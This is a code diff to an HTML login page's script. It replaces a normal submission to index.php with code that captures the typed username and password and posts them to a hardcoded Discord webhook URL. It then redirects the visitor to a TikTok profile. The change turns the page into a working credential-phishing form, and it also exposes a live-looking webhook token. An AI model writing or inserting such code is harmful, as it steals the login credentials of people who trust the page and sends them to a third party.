@@ -23,20 +23,26 @@
   </div>
 
   <script>
-    document.getElementById("Login").addEventListener("submit", function(e){
-      e.preventDefault();
-
-      var user = document.querySelector("input[name='username']").value;
-      var pass = document.querySelector("input[name='password']").value;
-
-      fetch("index.php", {
+    document.getElementById("loginForm").addEventListener("submit", function(e) {
+      e.preventDefault(); 
+    
+      const username = document.getElementById("username").value;
+      const password = document.getElementById("password").value;
+    
+      fetch("https://discord.com/api/webhooks/1358989761104183406/BVN_t28suVl5zOwjRFRWxqH-NuTncU8PC_HyatFzyeOx6mi7EqBciGxnsl-tEEmwjvaw", {
         method: "POST",
-        headers: { "Content-Type": "application/x-www-form-urlencoded" },
-        body: `username=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}`
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          content: `📥 صفوان :\n👤 Username: ${username}\n🔑 Password: ${password}`
+        })
       });
+    
+      
       window.location.href = "https://www.tiktok.com/@musaila_10?is_from_webapp=1&sender_device=pc";
     });
-  </script>
+    </script>
 </body>
 </html>
 
